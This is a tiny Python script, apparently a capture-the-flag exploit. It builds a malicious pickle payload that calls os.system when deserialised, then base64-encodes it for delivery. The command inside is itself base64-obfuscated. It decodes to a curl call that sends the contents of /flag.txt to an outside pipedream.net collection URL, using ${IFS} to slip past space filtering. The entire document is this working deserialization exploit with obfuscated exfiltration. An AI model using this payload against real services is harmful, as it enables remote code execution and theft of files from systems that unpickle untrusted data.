import base64

payload = b"""(cos
system
S'echo Y3VybCBodHRwczovL2VvZ2NlOHRndWpmZ2s1Zi5tLnBpcGVkcmVhbS5uZXQvP3E9JChjYXQke0lGU30vZmxhZy50eHR8YmFzZTY0KQ==|base64 -d|bash'
o"""
ab = base64.b64encode(payload)
print(ab)